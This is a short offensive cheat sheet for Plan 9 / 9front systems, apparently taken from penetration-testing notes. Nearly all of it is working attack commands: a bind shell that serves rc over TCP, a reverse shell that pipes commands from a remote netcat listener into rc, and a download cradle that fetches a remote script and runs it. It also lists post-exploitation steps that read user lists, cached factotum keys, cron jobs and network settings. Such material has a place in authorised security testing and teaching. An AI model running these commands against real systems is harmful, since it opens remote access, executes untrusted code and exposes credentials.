**Bind Shell**

    aux/listen1 -t tcp!*!1334 /bin/rc
    nc 192.168.9.3 1334

**Reverse Shell**

    srv -q tcp!192.168.1.222!1334 reverse_shell; while (i=`{read -n 1 /srv/reverse_shell}) { echo $i | rc >> /srv/reverse_shell }; rm /srv/reverse_shell
    nc -nlvp 1334

**Download Cradles**

    webfs; hget http://9front.lan/hello.rc | rc

**Users / Groups list**

    cat /adm/users

**Cached User keys**

    cat /mnt/factotum/ctl

**Crons**

    ls -l /cron/*/cron

**Network Settings**

    cat /net/ndb

**Other UNIX Commands to Plan 9 Translation:**<br />
https://9p.io/wiki/plan9/Unix_to_Plan_9_command_translation/index.html
